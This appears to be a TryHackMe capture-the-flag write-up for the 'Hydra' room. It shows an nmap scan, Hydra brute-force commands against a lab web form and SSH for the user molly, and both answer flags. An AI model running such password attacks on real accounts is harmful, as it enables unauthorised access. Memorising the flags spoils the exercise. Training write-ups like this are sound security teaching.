![Hydra Banner](https://i.imgur.com/kzeMRHz.png)

<p align="center">
   <img src="https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_Cover.png" alt="Hydra Logo">
</p>

# Hydra

This guide contains the answer and steps necessary to get to them for the [Hydra](https://tryhackme.com/room/hydra) room.

### Using Hydra

In this task we will be using Hydra to brute force passwords from someones account. Two types will be covered here: SSH and HTTP forms.

1. Use Hydra to bruteforce molly's web password. What is flag 1?

   We can do an nmap scan to find out which ports to use (or just navigate to the ip address in your browser).
   
   ```cmd
   sudo nmap -sS 10.10.111.109 -sV -sC
   ```
   
   ![Nmap](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_Nmap.png)
   
   ![Web Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_Login_Page.png)
   
   To bruteforce a web form we need to use the `http-post-form` argument. First we must check the page source to find out if it uses `get` or `post.
   
   ![Web Page Source](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_Web_Page_Source.png)
   
   Now we can put everything we need into the command.
   
   ```cmd
   hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.111.109 http-post-form "/login/:username=^USER^&password=^PASS^:F=incorrect" -t 4
   ```
   
   1[Hydra Web Form](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_Web_Page.png)
   
   Now we can log into the web page with our acquired credentials.
   
   ![Web Page Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_Web_Page_Flag.png)

   ><details><summary>Click for answer</summary>THM{2673a7dd116de68e85c48ec0b1f2612e}</details>

2. Use Hydra to bruteforce molly's SSH password. What is flag 2?

   To crack her SSH password we use the following command:
   
   ```cmd
   hydra -l molly -P /usr/share/wordlists/rockyou.txt ssh://10.10.111.109 -t 4 
   ```
   
   ![Hydra SSH](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_SSH.png)
   
   Now we can log in with:
   
   ```cmd
   ssh molly@10.10.111.109
   ```
   
   ![SSH Login](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_SSH_Login.png)
   
   Looking through the folders we can find the flag.
   
   ![SSH Flag](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_SSH_Flag.png)

   ><details><summary>Click for answer</summary>THM{c8eeb0468febbadea859baeb33b2541b}</details>

**Extra:** Interestingly, when going through the ubuntu user folder, we seem to come across a file with credentials and a flag similar to the first one.

![Discovery](https://github.com/Kevinovitz/TryHackMe_Writeups/raw/main/hydra/Hydra_SSH_Discovery.png)
